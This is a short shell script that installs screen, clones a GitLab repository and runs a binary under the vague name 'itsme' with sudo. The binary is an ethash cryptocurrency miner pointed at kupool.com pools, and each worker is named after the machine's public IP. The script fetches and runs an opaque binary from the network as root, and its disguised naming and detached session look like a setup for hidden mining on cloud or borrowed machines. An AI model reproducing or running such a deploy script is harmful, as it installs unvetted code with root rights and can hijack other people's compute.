#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS syahrowi.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w mainet.$ip -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
